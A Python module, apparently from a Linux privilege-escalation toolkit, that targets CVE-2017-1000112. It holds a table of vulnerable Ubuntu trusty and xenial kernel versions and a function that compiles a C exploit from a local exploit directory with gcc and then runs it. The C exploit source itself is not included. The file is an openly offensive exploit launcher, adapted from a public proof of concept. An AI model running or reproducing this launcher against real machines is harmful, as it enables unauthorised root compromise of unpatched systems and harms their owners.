"""
adapted from:
https://github.com/SecWiki/linux-kernel-exploits/blob/master/2017/CVE-2017-1000112/poc.c
"""
import os
import subprocess
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH


vulnerable_kernels = {
	"trusty": [
		["4.4.0-21-generic"],
		["4.4.0-22-generic"],
		["4.4.0-24-generic"],
		["4.4.0-28-generic"],
		["4.4.0-31-generic"],
		["4.4.0-34-generic"],
		["4.4.0-36-generic"],
		["4.4.0-38-generic"],
		["4.4.0-42-generic"],
		["4.4.0-45-generic"],
		["4.4.0-47-generic"],
		["4.4.0-51-generic"],
		["4.4.0-53-generic"],
		["4.4.0-57-generic"],
		["4.4.0-59-generic"],
		["4.4.0-62-generic"],
		["4.4.0-63-generic"],
		["4.4.0-64-generic"],
		["4.4.0-66-generic"],
		["4.4.0-67-generic"],
		["4.4.0-70-generic"],
		["4.4.0-71-generic"],
		["4.4.0-72-generic"],
		["4.4.0-75-generic"],
		["4.4.0-78-generic"],
		["4.4.0-79-generic"],
		["4.4.0-81-generic"],
		["4.4.0-83-generic"]
	],
	"xenial": [
		["4.8.0-34-generic"],
		["4.8.0-36-generic"],
		["4.8.0-39-generic"],
		["4.8.0-41-generic"],
		["4.8.0-45-generic"],
		["4.8.0-46-generic"],
		["4.8.0-49-generic"],
		["4.8.0-52-generic"],
		["4.8.0-54-generic"],
		["4.8.0-56-generic"],
		["4.8.0-58-generic"]
	]
}
source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE201710012.c")
compilation_path = os.path.join(PLAYGROUND_PATH, "exploit")
compilation_command = ["gcc", source_c_path, "-o", compilation_path]
exploit_command = compilation_path

def exploit():
	print("compiling: \'{}\'".format(" ".join(compilation_command)))
	return_code = subprocess.call(compilation_command)
	if return_code == 0 and os.path.exists(compilation_path):
		print("exploiting")
		subprocess.call(exploit_command)


if __name__ == "__main__":
	exploit()

